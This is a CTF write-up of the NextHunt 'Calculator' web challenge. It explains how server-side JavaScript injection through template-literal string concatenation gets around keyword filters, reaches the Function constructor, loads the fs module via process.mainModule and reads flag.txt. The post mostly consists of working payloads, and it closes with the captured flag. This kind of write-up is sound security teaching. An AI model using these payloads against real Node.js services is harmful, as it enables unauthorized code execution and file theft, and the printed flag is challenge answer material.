---
title: "Calculator"
slug: nexthunt-calculator
excerpt: "Server-Side JavaScript Injection via template literals to bypass keyword filters"
coverImage: "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800"
coverImageAlt: "Calculator - NextHunt CTF writeup"
categories:
  - NextHunt CTF
  - Web
  - SSJI
  - RCE
date: 2025-01-25
showToc: true
---

> "let's do some math"

The challenge provides a simple calculator web application that evaluates user expressions server-side.

## Analysis

The frontend JavaScript (`bundle.js`) reveals:

- A client-side filter blocking `['"\[\]\{\}]` characters
- User expressions are sent to `/calculate` endpoint via POST
- The server evaluates the expression and returns the result

### Server-Side Filtering

Testing revealed the server blocks certain keywords:

- `process`, `constructor`, `require`
- `global`, `globalThis`, `Function`
- `__proto__`

However, string concatenation inside template literals can bypass keyword detection.

## Exploitation

### Step 1: Bypass constructor filter

Using template literal concatenation to access the `Function` constructor:

```javascript
``[`const`+`ructor`][`const`+`ructor`](`return 1`)()
```

This chain:

1. ` `` ` - empty string
2. `` [`const`+`ructor`] `` - accesses `String.prototype.constructor`
3. `` [`const`+`ructor`] `` again - accesses `Function` constructor
4. `` (`return 1`)() `` - creates and executes a function

### Step 2: Bypass process filter

Inside the `Function` constructor body, we can split the `process` keyword:

```javascript
``[`const`+`ructor`][`const`+`ructor`](`var p=p`+`rocess;return p.env`)()
```

### Step 3: Load fs module and read flag

Using `process.mainModule.constructor._load()` to dynamically load the `fs` module:

```javascript
``[`const`+`ructor`][`const`+`ructor`](`
  var p=p`+`rocess;
  var m=p.mainModule.con`+`structor;
  var fs=m._load(\`fs\`);
  return fs.readdirSync(\`/app\`)
`)()
```

This revealed: `["Public","file.txt","flag.txt","node_modules","package-lock.json","package.json","server.js"]`

### Step 4: Read the flag

```javascript
``[`const`+`ructor`][`const`+`ructor`](`
  var p=p`+`rocess;
  var m=p.mainModule.con`+`structor;
  var fs=m._load(\`fs\`);
  return fs.readFileSync(\`/app/flag.txt\`,\`utf8\`)
`)()
```

## Key Takeaways

- **Template literals** (backticks) can bypass string-based keyword filters
- **String concatenation** inside function bodies can evade detection
- **`process.mainModule.constructor._load()`** provides an alternative to `require()`
- Client-side validation is easily bypassed by directly calling the API

## Flag

```
nexus{7h1s_1s_no7_3v4l_Th1s_15_3v1lllllllllllllllllll}
```
